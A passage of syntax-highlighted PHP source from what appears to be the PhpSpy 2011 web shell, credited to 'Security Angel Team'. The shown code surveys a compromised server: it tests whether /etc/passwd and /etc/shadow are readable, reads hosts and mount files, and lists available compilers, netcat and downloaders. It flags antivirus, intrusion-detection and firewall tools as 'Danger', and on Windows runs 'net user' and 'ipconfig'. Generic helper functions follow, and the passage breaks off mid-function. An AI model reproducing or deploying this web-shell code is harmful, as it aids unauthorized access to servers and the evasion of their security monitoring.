<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'mysql_get_client_info'</span>))
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">temp</span>[] = <span style="color: #99ffff;">"MySql ("</span>.<span style="color: #ffffff; background-color: #002451;">mysql_get_client_info(</span>).<span style="color: #99ffff;">")"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'mssql_connect'</span>))
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">temp</span>[] = <span style="color: #99ffff;">"MSSQL"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'pg_connect'</span>))
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">temp</span>[] = <span style="color: #99ffff;">"PostgreSQL"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'oci_connect'</span>))
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">temp</span>[] = <span style="color: #99ffff;">"Oracle"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Supported databases'</span>, <span style="color: #ffffff; background-color: #002451;">implode(</span><span style="color: #99ffff;">', '</span>, $<span style="color: #ffeead;">temp</span>));

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>( !<span style="color: #ff9da4; font-weight: bold;">IS_WIN</span> ) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">userful</span> = <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'gcc'</span>,<span style="color: #99ffff;">'lcc'</span>,<span style="color: #99ffff;">'cc'</span>,<span style="color: #99ffff;">'ld'</span>,<span style="color: #99ffff;">'make'</span>,<span style="color: #99ffff;">'php'</span>,<span style="color: #99ffff;">'perl'</span>,<span style="color: #99ffff;">'python'</span>,<span style="color: #99ffff;">'rub</span><span style="color: #99ffff; text-decoration: underline;">y'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'tar'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'gzip'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'bzip'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'bzip2'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'nc'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'locate'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'suidperl'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">danger</span> = <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'kav'</span>,<span style="color: #99ffff;">'nod32'</span>,<span style="color: #99ffff;">'bdcored'</span>,<span style="color: #99ffff;">'uvscan'</span>,<span style="color: #99ffff;">'sav'</span>,<span style="color: #99ffff;">'drwebd'</span>,<span style="color: #99ffff;">'clamd'</span>,<span style="color: #99ffff; text-decoration: underline;">'rkhunter'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'chkrootkit'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'iptables'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'ipfw'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'tripwire'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'shieldcc'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'portsentry'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'snort'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'ossec'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'lidsadm'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'tcplodg'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'sxid'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'logcheck'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'logwatch'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'sysmask'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'zmbscap'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'sawmill'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'wormscan'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'ninja'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">downloaders</span> = <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'wget'</span>,<span style="color: #99ffff;">'fetch'</span>,<span style="color: #99ffff;">'lynx'</span>,<span style="color: #99ffff;">'links'</span>,<span style="color: #99ffff;">'curl'</span>,<span style="color: #99ffff;">'get'</span>,<span style="color: #99ffff;">'lwp-mir</span><span style="color: #99ffff; text-decoration: underline;">ror'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Readable /etc/passwd'</span>, @<span style="color: #ffffff; background-color: #002451;">is_readable(</span><span style="color: #99ffff;">'/etc/passwd'</span>) ? <span style="color: #99ffff;">"yes"</span> : <span style="color: #99ffff;">'</span><span style="color: #99ffff; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Readable /etc/shadow'</span>, @<span style="color: #ffffff; background-color: #002451;">is_readable(</span><span style="color: #99ffff;">'/etc/shadow'</span>) ? <span style="color: #99ffff;">"yes"</span> : <span style="color: #99ffff;">'</span><span style="color: #99ffff; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'OS version'</span>, @<span style="color: #ffffff; background-color: #002451;">file_get_contents(</span><span style="color: #99ffff;">'/proc/version'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Distr name'</span>, @<span style="color: #ffffff; background-color: #002451;">file_get_contents(</span><span style="color: #99ffff;">'/etc/issue.net'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">safe_mode</span> = @<span style="color: #ffffff; background-color: #002451;">ini_get(</span><span style="color: #99ffff;">'safe_mode'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(!$<span style="color: #bbdaff;">GLOBALS</span>[<span style="color: #99ffff;">'safe_mode'</span>]) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">temp</span>=<span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">userful</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">item</span>)
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">which(</span>$<span style="color: #ffeead;">item</span>)){$<span style="color: #ffeead;">temp</span>[]=$<span style="color: #ffeead;">item</span>;}
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Userful'</span>, <span style="color: #ffffff; background-color: #002451;">implode(</span><span style="color: #99ffff;">', '</span>,$<span style="color: #ffeead;">temp</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">temp</span>=<span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">danger</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">item</span>)
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">which(</span>$<span style="color: #ffeead;">item</span>)){$<span style="color: #ffeead;">temp</span>[]=$<span style="color: #ffeead;">item</span>;}
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Danger'</span>, <span style="color: #ffffff; background-color: #002451;">implode(</span><span style="color: #99ffff;">', '</span>,$<span style="color: #ffeead;">temp</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">temp</span>=<span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">downloaders</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">item</span>)<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">which(</span>$<span style="color: #ffeead;">item</span>)){$<span style="color: #ffeead;">temp</span>[]=$<span style="color: #ffeead;">item</span>;}
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Downloaders'</span>, <span style="color: #ffffff; background-color: #002451;">implode(</span><span style="color: #99ffff;">', '</span>,$<span style="color: #ffeead;">temp</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Hosts'</span>, @<span style="color: #ffffff; background-color: #002451;">file_get_contents(</span><span style="color: #99ffff;">'/etc/hosts'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'HDD space'</span>, <span style="color: #ffffff; background-color: #002451;">execute(</span><span style="color: #99ffff;">'df -h'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Mount options'</span>, @<span style="color: #ffffff; background-color: #002451;">file_get_contents(</span><span style="color: #99ffff;">'/etc/fstab'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'OS Version'</span>,<span style="color: #ffffff; background-color: #002451;">execute(</span><span style="color: #99ffff;">'ver'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Account Settings'</span>,<span style="color: #ffffff; background-color: #002451;">execute(</span><span style="color: #99ffff;">'net accounts'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'User Accounts'</span>,<span style="color: #ffffff; background-color: #002451;">execute(</span><span style="color: #99ffff;">'net user'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'IP Configurate'</span>,<span style="color: #ffffff; background-color: #002451;">execute(</span><span style="color: #99ffff;">'ipconfig -all'</span>));
<span style="background-color: #003f8e;"> </span>   }
}<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">end</span>

<span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Undefined Action'</span>);
}

<span style="color: #ebbbff;">?&gt;</span>
<span style="color: #bbdaff;">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span>
<span style="color: #bbdaff;">&lt;div</span> <span style="color: #bbdaff;">style=</span><span style="color: #99ffff;">"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;</span><span style="color: #99ffff; text-decoration: underline;">background:#eee;"</span><span style="color: #bbdaff; text-decoration: underline;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;span</span> <span style="color: #bbdaff;">style=</span><span style="color: #99ffff;">"float:right;"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ebbbff;">&lt;?php</span> <span style="color: #ffffff; background-color: #002451;">debuginfo(</span>);<span style="color: #ffffff; background-color: #002451;">ob_end_flush(</span>);<span style="color: #ebbbff;">?&gt;</span><span style="color: #bbdaff;">&lt;/span&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ff9da4; font-weight: bold;">Powered</span> <span style="color: #ff9da4; font-weight: bold;">by</span> <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">title=</span><span style="color: #99ffff;">"Build 20110502"</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"http://www.4ngel.net"</span> <span style="color: #bbdaff;">target=</span><span style="color: #99ffff;">"_bl</span><span style="color: #99ffff; text-decoration: underline;">ank"</span><span style="color: #bbdaff; text-decoration: underline;">&gt;</span><span style="color: #ebbbff; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #d1f1a9; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">str_replace(</span><span style="color: #99ffff; text-decoration: underline;">'.'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'P.h.p.S.p.y'</span><span style="text-decoration: underline;">);</span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">2011</span><span style="color: #bbdaff; text-decoration: underline;">&lt;/a&gt;</span><span style="text-decoration: underline;">. </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">Copyright (</span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">C</span><span style="text-decoration: underline;">) </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">2004</span><span style="text-decoration: underline;">-</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">2011</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">&lt;a</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">href=</span><span style="color: #99ffff; text-decoration: underline;">"http://www.4ngel.net"</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">target=</span><span style="color: #99ffff; text-decoration: underline;">"_blank"</span><span style="color: #bbdaff; text-decoration: underline;">&gt;</span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">Security</span><span style="text-decoration: underline;"> </span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">Angel</span><span style="text-decoration: underline;"> </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">Team [</span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">S4T</span><span style="text-decoration: underline;">]</span><span style="color: #bbdaff; text-decoration: underline;">&lt;/a&gt;</span><span style="text-decoration: underline;"> </span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">All</span><span style="text-decoration: underline;"> </span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">Rights</span><span style="text-decoration: underline;"> </span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">Reserved</span><span style="text-decoration: underline;">.</span>
<span style="color: #bbdaff;">&lt;/div&gt;</span>
<span style="color: #bbdaff;">&lt;/body&gt;</span>
<span style="color: #bbdaff;">&lt;/html&gt;</span>

<span style="color: #ebbbff;">&lt;?php</span>

<span style="color: #7285b7; font-style: italic;">/*</span><span style="color: #7285b7; font-style: italic;">======================================================</span>
<span style="color: #7285b7; font-style: italic;">&#20989;&#25968;&#24211;</span>
<span style="color: #7285b7; font-style: italic;">======================================================*/</span>

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">secparam</span>($<span style="color: #ffeead;">n</span>, $<span style="color: #ffeead;">v</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">v</span> = <span style="color: #ffffff; background-color: #002451;">trim(</span>$<span style="color: #ffeead;">v</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">v</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;'</span>.$<span style="color: #ffeead;">n</span>.<span style="color: #99ffff;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;div class="infolist"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">strpos(</span>$<span style="color: #ffeead;">v</span>, <span style="color: #99ffff;">"\n"</span>) === <span style="color: #bbdaff;">false</span>)
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">v</span>.<span style="color: #99ffff;">'&lt;br /&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">else</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;pre&gt;'</span>.$<span style="color: #ffeead;">v</span>.<span style="color: #99ffff;">'&lt;/pre&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/div&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   }
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">m</span>($<span style="color: #ffeead;">msg</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> <span style="color: #99ffff;">'&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px s</span><span style="color: #99ffff; text-decoration: underline;">olid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> $<span style="color: #ffeead;">msg</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> <span style="color: #99ffff;">'&lt;/div&gt;'</span>;
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">scookie</span>($<span style="color: #ffeead;">key</span>, $<span style="color: #ffeead;">value</span>, $<span style="color: #ffeead;">life</span> = <span style="color: #ffffff; background-color: #002451;">0</span>, $<span style="color: #ffeead;">prefix</span> = <span style="color: #ffffff; background-color: #002451;">1</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">timestamp</span>, $<span style="color: #bbdaff;">_SERVER</span>, $<span style="color: #ffeead;">cookiepre</span>, $<span style="color: #ffeead;">cookiedomain</span>, $<span style="color: #ffeead;">cookiepath</span>, $<span style="color: #ffeead;">cookie</span><span style="color: #ffeead; text-decoration: underline;">life</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">key</span> = ($<span style="color: #ffeead;">prefix</span> ? $<span style="color: #ffeead;">cookiepre</span> : <span style="color: #99ffff;">''</span>).$<span style="color: #ffeead;">key</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">life</span> = $<span style="color: #ffeead;">life</span> ? $<span style="color: #ffeead;">life</span> : $<span style="color: #ffeead;">cookielife</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">useport</span> = $<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'SERVER_PORT'</span>] == <span style="color: #ffffff; background-color: #002451;">443</span> ? <span style="color: #ffffff; background-color: #002451;">1</span> : <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">setcookie(</span>$<span style="color: #ffeead;">key</span>, $<span style="color: #ffeead;">value</span>, $<span style="color: #ffeead;">timestamp</span>+$<span style="color: #ffeead;">life</span>, $<span style="color: #ffeead;">cookiepath</span>, $<span style="color: #ffeead;">cookiedomain</span>, $<span style="color: #ffeead;">usepo</span><span style="color: #ffeead; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
}<span style="color: #ff9da4; background-color: #003f8e;">   </span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">multi</span>($<span style="color: #ffeead;">num</span>, $<span style="color: #ffeead;">perpage</span>, $<span style="color: #ffeead;">curpage</span>, $<span style="color: #ffeead;">tablename</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">multipage</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">num</span> &gt; $<span style="color: #ffeead;">perpage</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">page</span> = <span style="color: #ffffff; background-color: #002451;">10</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">offset</span> = <span style="color: #ffffff; background-color: #002451;">5</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">pages</span> = @<span style="color: #ffffff; background-color: #002451;">ceil(</span>$<span style="color: #ffeead;">num</span> / $<span style="color: #ffeead;">perpage</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">page</span> &gt; $<span style="color: #ffeead;">pages</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">from</span> = <span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">to</span> = $<span style="color: #ffeead;">pages</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">from</span> = $<span style="color: #ffeead;">curpage</span> - $<span style="color: #ffeead;">offset</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">to</span> = $<span style="color: #ffeead;">curpage</span> + $<span style="color: #ffeead;">page</span> - $<span style="color: #ffeead;">offset</span> - <span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">from</span> &lt; <span style="color: #ffffff; background-color: #002451;">1</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">to</span> = $<span style="color: #ffeead;">curpage</span> + <span style="color: #ffffff; background-color: #002451;">1</span> - $<span style="color: #ffeead;">from</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">from</span> = <span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(($<span style="color: #ffeead;">to</span> - $<span style="color: #ffeead;">from</span>) &lt; $<span style="color: #ffeead;">page</span> &amp;&amp; ($<span style="color: #ffeead;">to</span> - $<span style="color: #ffeead;">from</span>) &lt; $<span style="color: #ffeead;">pages</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">to</span> = $<span style="color: #ffeead;">page</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span>($<span style="color: #ffeead;">to</span> <span style="color: #bbdaff;">&gt;</span> $<span style="color: #ffeead;">pages</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">from</span> = $<span style="color: #ffeead;">curpage</span> - $<span style="color: #ffeead;">pages</span> + $<span style="color: #ffeead;">to</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">to</span> = $<span style="color: #ffeead;">pages</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(($<span style="color: #ffeead;">to</span> - $<span style="color: #ffeead;">from</span>) &lt; $<span style="color: #ffeead;">page</span> &amp;&amp; ($<span style="color: #ffeead;">to</span> - $<span style="color: #ffeead;">from</span>) &lt; $<span style="color: #ffeead;">pages</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">from</span> = $<span style="color: #ffeead;">pages</span> - $<span style="color: #ffeead;">page</span> + <span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
